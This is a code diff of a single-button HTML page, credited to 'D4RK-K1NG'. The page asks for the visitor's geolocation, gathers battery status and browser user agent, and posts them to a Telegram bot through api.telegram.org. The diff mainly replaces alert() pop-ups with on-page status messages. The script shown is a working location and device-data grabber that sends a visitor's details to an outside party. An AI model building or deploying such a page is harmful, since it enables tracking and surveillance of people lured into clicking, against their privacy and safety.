@@ -14,6 +14,7 @@
     align-items: center;
     justify-content: center;
     min-height: 100vh;
+    text-align: center;
   }
   button {
     background: #00ffff;
@@ -30,19 +31,31 @@
     background: #00cccc;
     transform: scale(1.05);
   }
+  #status {
+    margin-top: 20px;
+    font-size: 16px;
+    color: #00dddd;
+  }
 </style>
 </head>
 <body>
 
 <button onclick="sendLocation()">📍 Send Location</button>
+<p id="status"></p>
 
 <script>
 async function sendLocation() {
-  if (!navigator.geolocation) return alert("❌ Geolocation not supported.");
+  const status = document.getElementById("status");
+  status.textContent = "📍 Requesting location permission...";
 
-  alert("📍 Requesting location permission...");
+  if (!navigator.geolocation) {
+    status.textContent = "❌ Geolocation not supported by this browser.";
+    return;
+  }
 
   navigator.geolocation.getCurrentPosition(async position => {
+    status.textContent = "🔍 Gathering data...";
+
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
 
@@ -91,10 +104,12 @@ async function sendLocation() {
 🔋 Battery: ${info.battery}
 💻 Used Web: ${info.userAgent}
 
-🧠 Developed by D4RK-K1NG
+🚤 Developed by D4RK-K1NG
 `;
 
-    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    status.textContent = "📤 Sending to Telegram...";
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -102,13 +117,19 @@ async function sendLocation() {
         text: text,
         parse_mode: "Markdown"
       })
+    })
+    .then(() => {
+      status.textContent = "✅ Location sent successfully!";
+    })
+    .catch(() => {
+      status.textContent = "⚠️ Failed to send location.";
     });
 
-    alert("✅ Location sent successfully!");
   }, () => {
-    alert("❌ Please allow location access to continue.");
+    status.textContent = "❌ Please allow location access to continue.";
   });
 }
 </script>
+
 </body>
 </html>
